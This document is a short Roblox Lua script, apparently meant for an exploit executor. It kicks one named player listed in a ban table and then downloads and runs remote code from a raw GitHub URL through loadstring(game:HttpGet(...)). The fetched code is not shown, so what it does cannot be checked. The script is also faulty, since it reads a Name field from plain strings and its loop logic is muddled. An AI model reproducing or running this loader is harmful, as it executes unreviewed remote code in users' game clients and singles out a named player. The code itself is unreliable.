if not _G.executed then
while not _G.pipi do 
local Banned = {
  Players = {
    "whatjggotdeleted"
  }
  }
 
  for i,v in pairs(Banned.Players) do 
    if v.Name == game.Players.LocalPlayer.Name then game.Players.LocalPlayer:Kick("lol") _G.pipi = true end
  end
    loadstring(game:HttpGet("https://raw.githubusercontent.com/susamongusbkaka/stuff/main/ban.lua",true))()

    _G.executed = true
end
wait(3)
end
